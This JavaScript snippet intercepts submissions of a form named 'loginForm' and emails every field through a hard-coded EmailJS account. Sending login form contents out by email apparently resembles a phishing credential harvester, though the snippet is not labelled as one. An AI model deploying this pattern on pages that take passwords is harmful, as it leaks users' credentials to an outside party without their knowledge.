// Include Email.js SDK by adding the following script tag to your HTML:
// <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>

// Initialize Email.js with your User ID
emailjs.init("user_9hl9awywx6zp2sVjR");

document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault();

    // Get form data
    const formData = new FormData(this);

    // Send the form data as an email using Email.js
    emailjs.send("service_142u1mu", "template_avc41ik", formData)
        .then(function(response) {
            alert("Email sent successfully!");
            document.getElementById("loginForm").reset();
        }, function(error) {
            alert("Email could not be sent. Please try again later.");
            console.error("Email Error:", error);
        });
});
